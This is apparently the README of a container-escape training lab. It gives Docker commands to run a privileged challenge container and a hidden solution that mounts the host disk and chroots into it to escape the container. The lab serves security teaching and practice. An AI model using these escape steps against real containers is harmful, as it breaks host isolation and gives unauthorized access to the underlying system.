# docker-escape-labs
Docker labs to practice container escape, for educational purpose only.

## chall01 - privileged

```
docker build -t ctf-privileged .
docker run --rm -it --privileged ctf-privileged
```

<details>
  <summary>Solution</summary>

  1. Retrieve the host disk
  ```
  fdisk -l
  ```
  2. Create a new folder
  ```
  mkdir /mnt/host
  ```
  3. Mount the host disk into the new folder
  ```
  mount /dev/sda1 /mnt/host
  ```
  4. Change the chroot to the new folder
  ```
  chroot /mnt/host /bin/bash
  ```

</details>
